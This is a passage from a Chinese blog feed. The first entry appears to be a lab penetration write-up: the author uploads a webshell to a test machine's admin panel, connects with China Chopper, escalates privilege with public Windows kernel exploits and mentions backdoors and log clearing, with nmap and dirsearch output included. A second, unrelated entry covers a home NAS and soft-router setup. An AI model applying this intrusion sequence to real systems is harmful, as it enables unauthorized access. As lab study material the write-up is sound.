id="2-漏洞挖掘"><a href="#2-漏洞挖掘" class="headerlink" title="2. 漏洞挖掘"></a>2. 漏洞挖掘</h1><p>我们的思路是找到上传点，把马上传上去</p><p>我们进入了85后台之后，发现了上传点如下<br> <img src="/upload_image/2019/04/01_2019_shurtcuts.png" alt="上传点"></p><p>我们成功把马上传上去之后,可以在info里找到它的路径，或者从后台内容管理的地方中找出来。</p><p><img src="/upload_image/2019/04/02_2019_shortcuts.png" alt="后台路径观察"> </p><p><img src="/upload_image/2019/04/03_2019_shortcuts.png" alt="后台内容管理"> </p><p>连上菜刀成功</p><h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h1><p>网上找了找资料，发现SecWiki的提权工具最好用，附上<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">链接</a></p><p>用法：通过原来上传的地方把提权工具上传上去，然后直接运行命令即可</p><p>截图如下</p><p><img src="/upload_image/2019/04/04_2019_shortcuts.png" alt="提权截图"></p><p>之后是干啥都行了，留后门以及清除痕迹的这些东西以后遇到了再进行补充</p><hr><p><span id="jump_anchor">nmap扫描结果</span></p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -p- -n 192.168.241.131</span></span><br><span class="line">Starting Nmap <span class="number">7.70</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2019</span><span class="number">-04</span><span class="number">-21</span> <span class="number">14</span>:<span class="number">21</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.241</span><span class="number">.131</span></span><br><span class="line">Host is up (<span class="number">0.00049</span>s latency).</span><br><span class="line">Not shown: <span class="number">65515</span> closed ports</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line"><span class="number">23</span>/tcp    <span class="built_in">open</span>  telnet             Microsoft Windows XP telnetd</span><br><span class="line"><span class="number">80</span>/tcp    <span class="built_in">open</span>  <span class="keyword">http</span>               Apache httpd <span class="number">2.2</span><span class="number">.15</span> ((Win32) PHP/<span class="number">5.3</span><span class="number">.15</span>)</span><br><span class="line"><span class="number">82</span>/tcp    <span class="built_in">open</span>  <span class="keyword">http</span>               Microsoft IIS httpd <span class="number">7.0</span></span><br><span class="line"><span class="number">84</span>/tcp    <span class="built_in">open</span>  <span class="keyword">http</span>               Microsoft IIS httpd <span class="number">7.0</span></span><br><span class="line"><span class="number">85</span>/tcp    <span class="built_in">open</span>  <span class="keyword">http</span>               Microsoft IIS httpd <span class="number">7.0</span></span><br><span class="line"><span class="number">135</span>/tcp   <span class="built_in">open</span>  msrpc              Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   <span class="built_in">open</span>  netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">445</span>/tcp   <span class="built_in">open</span>  microsoft-ds       Microsoft Windows Server <span class="number">2008</span> R2 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">1433</span>/tcp  <span class="built_in">open</span>  ms-sql-s           Microsoft SQL Server <span class="number">2008</span> <span class="number">10.00</span><span class="number">.1600</span>; RTM</span><br><span class="line"><span class="number">2383</span>/tcp  <span class="built_in">open</span>  ms-olap4?</span><br><span class="line"><span class="number">3306</span>/tcp  <span class="built_in">open</span>  mysql              MySQL <span class="number">5.5</span><span class="number">.27</span></span><br><span class="line"><span class="number">3389</span>/tcp  <span class="built_in">open</span>  ssl/ms-wbt-server?</span><br><span class="line"><span class="number">5985</span>/tcp  <span class="built_in">open</span>  <span class="keyword">http</span>               Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line"><span class="number">47001</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span>               Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line"><span class="number">49152</span>/tcp <span class="built_in">open</span>  msrpc              Microsoft Windows RPC</span><br><span class="line"><span class="number">49153</span>/tcp <span class="built_in">open</span>  msrpc              Microsoft Windows RPC</span><br><span class="line"><span class="number">49154</span>/tcp <span class="built_in">open</span>  msrpc              Microsoft Windows RPC</span><br><span class="line"><span class="number">49155</span>/tcp <span class="built_in">open</span>  msrpc              Microsoft Windows RPC</span><br><span class="line"><span class="number">49156</span>/tcp <span class="built_in">open</span>  msrpc              Microsoft Windows RPC</span><br><span class="line"><span class="number">49157</span>/tcp <span class="built_in">open</span>  msrpc              Microsoft Windows RPC</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">01</span>:<span class="number">46</span>:FB (VMware)</span><br><span class="line">Service Info: Host: IIS70-CN; OSs: Windows XP, Windows; CPE: cpe:/o:microsoft:windows_xp, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report <span class="keyword">any</span> incorrect results <span class="keyword">at</span> <span class="keyword">https</span>://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">105.96</span> <span class="built_in">seconds</span></span><br></pre></td></tr></tbody></table></figure><p><span id="jump_82_port">82端口扫描结果</span></p><figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">λ python dirsearch.py -u <span class="string">http:</span><span class="comment">//192.168.241.131:82 -e asp</span></span><br><span class="line"></span><br><span class="line"> _|. _ _  _  _  _ _|_    v0<span class="number">.3</span><span class="number">.8</span></span><br><span class="line">(_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line"><span class="string">Extensions:</span> asp | <span class="string">Threads:</span> <span class="number">10</span> | Wordlist <span class="string">size:</span> <span class="number">6064</span></span><br><span class="line"></span><br><span class="line">Error <span class="string">Log:</span> <span class="string">C:</span>\Users\Elliot\OneDrive\桌面\同步文件夹\靶机渗透\dirsearch\logs\errors<span class="number">-19</span><span class="number">-04</span><span class="number">-21</span>_14<span class="number">-32</span><span class="number">-56.</span>log</span><br><span class="line"></span><br><span class="line"><span class="string">Target:</span> <span class="string">http:</span><span class="comment">//192.168.241.131:82</span></span><br><span class="line"></span><br><span class="line">[<span class="number">14</span>:<span class="number">32</span>:<span class="number">56</span>] <span class="string">Starting:</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">32</span>:<span class="number">56</span>] <span class="number">403</span> -  <span class="number">312</span>B  - <span class="regexp">/%2e%2e/</span>google.com</span><br><span class="line">[<span class="number">14</span>:<span class="number">32</span>:<span class="number">56</span>] <span class="number">400</span> -  <span class="number">324</span>B  - <span class="regexp">/%ff/</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">05</span>] <span class="number">301</span> -  <span class="number">163</span>B  - <span class="regexp">/aspnet_client  -&gt;  http:/</span><span class="regexp">/192.168.241.131:82/</span>aspnet_client/</span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">05</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /asp.aspx</span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">07</span>] <span class="number">301</span> -  <span class="number">153</span>B  - <span class="regexp">/css  -&gt;  http:/</span><span class="regexp">/192.168.241.131:82/</span>css/</span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">07</span>] <span class="number">301</span> -  <span class="number">158</span>B  - <span class="regexp">/database  -&gt;  http:/</span><span class="regexp">/192.168.241.131:82/</span>database/</span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">07</span>] <span class="number">403</span> -    <span class="number">1</span>KB - <span class="regexp">/database/</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">09</span>] <span class="number">301</span> -  <span class="number">155</span>B  - <span class="regexp">/image  -&gt;  http:/</span><span class="regexp">/192.168.241.131:82/</span>image/</span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">09</span>] <span class="number">301</span> -  <span class="number">156</span>B  - <span class="regexp">/images  -&gt;  http:/</span><span class="regexp">/192.168.241.131:82/</span>images/</span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">09</span>] <span class="number">301</span> -  <span class="number">156</span>B  - <span class="regexp">/Images  -&gt;  http:/</span><span class="regexp">/192.168.241.131:82/</span>Images/</span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">09</span>] <span class="number">301</span> -  <span class="number">157</span>B  - <span class="regexp">/include  -&gt;  http:/</span><span class="regexp">/192.168.241.131:82/</span>include/</span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">09</span>] <span class="number">403</span> -    <span class="number">1</span>KB - <span class="regexp">/include/</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">10</span>] <span class="number">200</span> -   <span class="number">23</span>KB - /index.asp</span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">17</span>] <span class="number">301</span> -  <span class="number">156</span>B  - <span class="regexp">/system  -&gt;  http:/</span><span class="regexp">/192.168.241.131:82/</span>system/</span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">17</span>] <span class="number">200</span> -    <span class="number">4</span>KB - <span class="regexp">/system/</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">18</span>] <span class="number">403</span> -    <span class="number">2</span>KB - /Trace.axd</span><br><span class="line">[<span class="number">14</span>:<span class="number">33</span>:<span class="number">19</span>] <span class="number">500</span> -    <span class="number">3</span>KB - /WebResource.axd?d=LER8t9aS</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></tbody></table></figure><p><span id="jump_84_port">84端口扫描结果</span></p><figure class="highlight crystal"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">λ python dirsearch.py -u <span class="symbol">http:</span>/<span class="regexp">/192.168.241.131:84 -e asp</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp"> _|. _ _  _  _  _ _|_    v0.3.8</span></span><br><span class="line"><span class="regexp">(_||| _) (/</span>_(_|| (_| )</span><br><span class="line"></span><br><span class="line"><span class="symbol">Extensions:</span> asp | <span class="symbol">Threads:</span> <span class="number">10</span> | Wordlist <span class="symbol">size:</span> <span class="number">6064</span></span><br><span class="line"></span><br><span class="line">Error <span class="symbol">Log:</span> <span class="symbol">C:</span>\Users\Elliot\OneDrive\桌面\同步文件夹\靶机渗透\dirsearch\logs\errors-<span class="number">19</span>-<span class="number">0</span>4-<span class="number">21_14</span>-<span class="number">38</span>-<span class="number">10</span>.log</span><br><span class="line"></span><br><span class="line"><span class="symbol">Target:</span> <span class="symbol">http:</span>/<span class="regexp">/192.168.241.131:84</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">[14:38:10] Starting:</span></span><br><span class="line"><span class="regexp">[14:38:10] 403 -  312B  - /</span>%<span class="number">2e</span>%<span class="number">2e</span>/google.com</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">10</span>] <span class="number">400</span> -  <span class="number">324</span>B  - <span class="regexp">/%ff/</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">13</span>] <span class="number">301</span> -  <span class="number">157</span>B  - <span class="regexp">/aboutus  -&gt;  http:/</span><span class="regexp">/192.168.241.131:84/aboutus</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:14] 301 -  155B  - /</span>ADMIN  -&gt;  <span class="symbol">http:</span>/<span class="regexp">/192.168.241.131:84/</span>ADMIN/</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">14</span>] <span class="number">301</span> -  <span class="number">155</span>B  - <span class="regexp">/admin  -&gt;  http:/</span><span class="regexp">/192.168.241.131:84/admin</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:14] 301 -  155B  - /</span>Admin  -&gt;  <span class="symbol">http:</span>/<span class="regexp">/192.168.241.131:84/</span>Admin/</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">14</span>] <span class="number">500</span> -    <span class="number">0</span>B  - <span class="regexp">/admin%20/</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">14</span>] <span class="number">200</span> -  <span class="number">385</span>B  - <span class="regexp">/a%5c.aspx</span></span><br><span class="line"><span class="regexp">[14:38:14] 200 -  390B  - /admin</span>.aspx</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">14</span>] <span class="number">500</span> -    <span class="number">0</span>B  - <span class="regexp">/admin.</span></span><br><span class="line"><span class="regexp">[14:38:14] 200 -  540B  - /admin</span><span class="regexp">/fckeditor/editor</span><span class="regexp">/filemanager/browser</span><span class="regexp">/default/connectors</span><span class="regexp">/aspx/connector</span>.aspx</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">14</span>] <span class="number">200</span> -  <span class="number">506</span>B  - <span class="regexp">/admin/fckeditor</span><span class="regexp">/editor/filemanager</span><span class="regexp">/connectors/aspx</span><span class="regexp">/connector.aspx</span></span><br><span class="line"><span class="regexp">[14:38:14] 200 -  500B  - /admin</span><span class="regexp">/fckeditor/editor</span><span class="regexp">/filemanager/connectors</span><span class="regexp">/aspx/upload</span>.aspx</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">14</span>] <span class="number">200</span> -  <span class="number">492</span>B  - <span class="regexp">/admin/fckeditor</span><span class="regexp">/editor/filemanager</span><span class="regexp">/upload/aspx</span><span class="regexp">/upload.aspx</span></span><br><span class="line"><span class="regexp">[14:38:15] 200 -    6KB - /admin</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:15] 200 -    6KB - /admin</span><span class="regexp">/?/login</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">17</span>] <span class="number">200</span> -  <span class="number">386</span>B  - <span class="regexp">/asp.aspx</span></span><br><span class="line"><span class="regexp">[14:38:17] 301 -  163B  - /aspnet</span>_client  -&gt;  <span class="symbol">http:</span>/<span class="regexp">/192.168.241.131:84/aspnet</span>_client/</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">17</span>] <span class="number">200</span> -  <span class="number">394</span>B  - <span class="regexp">/aspxspy.aspx</span></span><br><span class="line"><span class="regexp">[14:38:19] 200 -  479B  - /ckeditor</span><span class="regexp">/ckfinder/core</span><span class="regexp">/connector/aspx</span><span class="regexp">/connector.aspx</span></span><br><span class="line"><span class="regexp">[14:38:19] 200 -  392B  - /cmdasp</span>.aspx</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">19</span>] <span class="number">301</span> -  <span class="number">157</span>B  - <span class="regexp">/content  -&gt;  http:/</span><span class="regexp">/192.168.241.131:84/content</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:20] 301 -  158B  - /</span>Download  -&gt;  <span class="symbol">http:</span>/<span class="regexp">/192.168.241.131:84/</span>Download/</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">20</span>] <span class="number">301</span> -  <span class="number">158</span>B  - <span class="regexp">/download  -&gt;  http:/</span><span class="regexp">/192.168.241.131:84/download</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:21] 200 -  527B  - /fckeditor</span><span class="regexp">/editor/filemanager</span><span class="regexp">/browser/default</span><span class="regexp">/connectors/aspx</span><span class="regexp">/connector.aspx</span></span><br><span class="line"><span class="regexp">[14:38:21] 200 -  493B  - /fckeditor</span><span class="regexp">/editor/filemanager</span><span class="regexp">/connectors/aspx</span><span class="regexp">/connector.aspx</span></span><br><span class="line"><span class="regexp">[14:38:21] 200 -  487B  - /fckeditor</span><span class="regexp">/editor/filemanager</span><span class="regexp">/connectors/aspx</span><span class="regexp">/upload.aspx</span></span><br><span class="line"><span class="regexp">[14:38:21] 200 -  479B  - /fckeditor</span><span class="regexp">/editor/filemanager</span><span class="regexp">/upload/aspx</span><span class="regexp">/upload.aspx</span></span><br><span class="line"><span class="regexp">[14:38:21] 200 -  402B  - /file</span>_upload.aspx</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">22</span>] <span class="number">200</span> -  <span class="number">506</span>B  - <span class="regexp">/includes/fckeditor</span><span class="regexp">/editor/filemanager</span><span class="regexp">/connectors/aspx</span><span class="regexp">/upload.aspx</span></span><br><span class="line"><span class="regexp">[14:38:22] 200 -  512B  - /includes</span><span class="regexp">/fckeditor/editor</span><span class="regexp">/filemanager/connectors</span><span class="regexp">/aspx/connector</span>.aspx</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">22</span>] <span class="number">200</span> -  <span class="number">498</span>B  - <span class="regexp">/includes/fckeditor</span><span class="regexp">/editor/filemanager</span><span class="regexp">/upload/aspx</span><span class="regexp">/upload.aspx</span></span><br><span class="line"><span class="regexp">[14:38:22] 200 -  546B  - /includes</span><span class="regexp">/fckeditor/editor</span><span class="regexp">/filemanager/browser</span><span class="regexp">/default/connectors</span><span class="regexp">/aspx/connector</span>.aspx</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">23</span>] <span class="number">200</span> -   <span class="number">10</span>KB - <span class="regexp">/index.html</span></span><br><span class="line"><span class="regexp">[14:38:23] 200 -  394B  - /install</span>.aspx</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">23</span>] <span class="number">301</span> -  <span class="number">157</span>B  - <span class="regexp">/install  -&gt;  http:/</span><span class="regexp">/192.168.241.131:84/install</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:23] 301 -  157B  - /</span>Install  -&gt;  <span class="symbol">http:</span>/<span class="regexp">/192.168.241.131:84/</span>Install/</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">23</span>] <span class="number">301</span> -  <span class="number">157</span>B  - <span class="regexp">/INSTALL  -&gt;  http:/</span><span class="regexp">/192.168.241.131:84/</span>INSTALL/</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">23</span>] <span class="number">301</span> -  <span class="number">163</span>B  - <span class="regexp">/international  -&gt;  http:/</span><span class="regexp">/192.168.241.131:84/international</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:23] 200 -  271B  - /install</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:23] 301 -  152B  - /js</span>  -&gt;  <span class="symbol">http:</span>/<span class="regexp">/192.168.241.131:84/js</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:24] 301 -  153B  - /log</span>  -&gt;  <span class="symbol">http:</span>/<span class="regexp">/192.168.241.131:84/log</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:27] 301 -  154B  - /plus</span>  -&gt;  <span class="symbol">http:</span>/<span class="regexp">/192.168.241.131:84/plus</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:28] 500 -    0B  - /rating</span>_over.</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">28</span>] <span class="number">301</span> -  <span class="number">157</span>B  - <span class="regexp">/release  -&gt;  http:/</span><span class="regexp">/192.168.241.131:84/release</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:28] 200 -  496B  - /scripts</span><span class="regexp">/ckeditor/ckfinder</span><span class="regexp">/core/connector</span><span class="regexp">/aspx/connector</span>.aspx</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">29</span>] <span class="number">200</span> -  <span class="number">394</span>B  - <span class="regexp">/service.asmx</span></span><br><span class="line"><span class="regexp">[14:38:30] 200 -  386B  - /spy</span>.aspx</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">31</span>] <span class="number">301</span> -  <span class="number">158</span>B  - <span class="regexp">/template  -&gt;  http:/</span><span class="regexp">/192.168.241.131:84/template</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:31] 200 -  388B  - /test</span>.aspx</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">31</span>] <span class="number">200</span> -  <span class="number">433</span>B  - <span class="regexp">/Trace.axd</span></span><br><span class="line"><span class="regexp">[14:38:31] 200 -  450B  - /umbraco</span><span class="regexp">/webservices/code</span>EditorSave.asmx</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">32</span>] <span class="number">200</span> -  <span class="number">392</span>B  - <span class="regexp">/upload.aspx</span></span><br><span class="line"><span class="regexp">[14:38:32] 301 -  154B  - /user</span>  -&gt;  <span class="symbol">http:</span>/<span class="regexp">/192.168.241.131:84/user</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">[14:38:32] 500 -    0B  - /</span>WEB-INF./web.xml</span><br><span class="line">[<span class="number">14</span>:<span class="number">38</span>:<span class="number">32</span>] <span class="number">200</span> -  <span class="number">367</span>B  - <span class="regexp">/WebResource.axd?d=LER8t9aS</span></span><br><span class="line"><span class="regexp">[14:38:40] 302 -  158B  - /user</span><span class="regexp">/  -&gt;  http:/</span><span class="regexp">/192.168.241.131:84/user</span><span class="regexp">/login.aspx</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">Task Completed</span></span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;某次靶机getshell过程&lt;/p&gt;
    
    </summary>
    
      <category term="Penetration" scheme="https://zzdkl.com.cn/categories/Penetration/"/>
    
    
      <category term="Penetration" scheme="https://zzdkl.com.cn/tags/Penetration/"/>
    
  </entry>
  
  <entry>
    <title>家庭服务器：NAS+HTPC+软路由</title>
    <link href="https://zzdkl.com.cn/2019/08/29/Home_server/"/>
    <id>https://zzdkl.com.cn/2019/08/29/Home_server/</id>
    <published>2019-08-29T02:04:35.850Z</published>
    <updated>2019-08-29T02:05:59.068Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>最近博客更新的内容少了，主要是最近太累了，又接近考试了，所以不能权衡两方面的工作</p><p>最近有了搭建私有云的想法，实现目的有其下几个：</p><ol><li>离线下载（主要是百度云离线、下载）</li><li>家庭数据备份（如相片）</li><li>数据同步（私有云）</li><li>（个人服务器）</li></ol><a id="more"></a><h2 id="0-1-HTPC-离线下载"><a href="#0-1-HTPC-离线下载" class="headerlink" title="0.1 HTPC + 离线下载"></a>0.1 HTPC + 离线下载</h2><p>主要是为了能够高清看美剧（1080P），国内没有1080P在线看网站（基本都是720P），国外高清源没有中英字幕</p><p>解决办法 ： 下载无字幕版，加字幕    <del>(隐藏坑点 ： 投影到电视盒子的时候是否可以添加字幕？)</del></p><pre><code>新增问题 : 如何搭建一个网站可以在移动端进行观看？</code></pre><p>新解决办法 ： <strong>kodi + emby</strong></p><h2 id="0-2-家庭数据备份"><a href="#0-2-家庭数据备份" class="headerlink" title="0.2 家庭数据备份"></a>0.2 家庭数据备份</h2><p>我们会遇到这样的一个场景 ： 外出游玩时弄了很多相片，导致手机存储空间越来越小</p><p>主要是相片，应用场景为 ： 可以通过一个APP将相片上传到NAS，网络环境可以为内外网</p><h1 id="01-基本设置"><a href="#01-基本设置" class="headerlink" title="01 基本设置"></a>01 基本设置</h1><p>基本定了，上X86处理器，win10系统  <del>esxi底层</del> + Windows自带资源池 <del>ZFS存储服务器</del>  + 软路由 + HTPC + NAS</p><p><a href="https://post.smzdm.com/p/674680/" target="_blank" rel="noopener">参考资料：总方向</a></p><p><del>~ 配置<a href="https://post.smzdm.com/p/296026/p11/" target="_blank" rel="noopener">ZFS存储服务器</a> ~</del> zfs过于麻烦，选用Windows自带资源池<br><del><a href="https://www.chiphell.com/thread-1547570-1-1.html" target="_blank" rel="noopener">freenas与omnios+napp-it的速度对比</a></del></p><h2 id="1-1-HTPC-设置"><a href="#1-1-HTPC-设置" class="headerlink" title="1.1 HTPC 设置"></a>1.1 HTPC 设置</h2><p>使用kodi，很好用的播放器，暂定为Win10机上的HTPC播放器</p><p><a href="https://zhuanlan.zhihu.com/p/43939225" target="_blank" rel="noopener">参考资料1</a><br><a href="https://www.iplaysoft.com/kodi.html" target="_blank" rel="noopener">参考资料2</a></p><p>另外对于本地媒体库可<a href="https://pockies.github.io/2019/03/25/everaver-emby-kodi/" target="_blank" rel="noopener">参考链接</a></p><p>使用emby <a href="https://emby.media/index.html" target="_blank" rel="noopener">官方链接</a>  这东西真的是太棒了！！！</p><h2 id="1-2-HTPC-总结"><a href="#1-2-HTPC-总结" class="headerlink" title="1.2 HTPC 总结"></a>1.2 HTPC 总结</h2><p>HTPC基本告一段落，win10机器同时启用kodi作为HTPC，使用emby作为网络流媒体播放器！</p><p>字幕kodi可以自选，emby可以通过同样的命名可进行识别。</p><h1 id="02-软路由"><a href="#02-软路由" class="headerlink" title="02 软路由"></a>02 软路由</h1><p>软路由要求 ： <strong>5G WiFi</strong> （取决于AP）和 <strong>无缝漫游</strong> （DHCP的IP地址不变）</p><h2 id="2-1-AP选择"><a href="#2-1-AP选择" class="headerlink" title="2.1 AP选择"></a>2.1 AP选择</h2><p><a href="https://zhuanlan.zhihu.com/p/30492965" target="_blank" rel="noopener">AC和AP是什么</a></p><p>需要终端和AP同时支持无缝漫游才行，这里推荐<code>Ubnt 捷联讯通</code>的AP方案，支持5G WiFi和无缝漫游</p><p><a href="https://post.smzdm.com/p/a83dz8vn/" target="_blank" rel="noopener">参考链接</a></p><h2 id="2-2-软路由设置"><a href="#2-2-软路由设置" class="headerlink" title="2.2 软路由设置"></a>2.2 软路由设置</h2><p>软路由lede<a href="https://www.right.com.cn/forum/thread-211792-1-1.html" target="_blank" rel="noopener">入门阅读</a></p><p>首先，使用hyper-V虚拟机，下载LEDE的虚拟机<a href="https://firmware.koolshare.cn/LEDE_X64_fw867/虚拟机转盘或PE下写盘专用/" 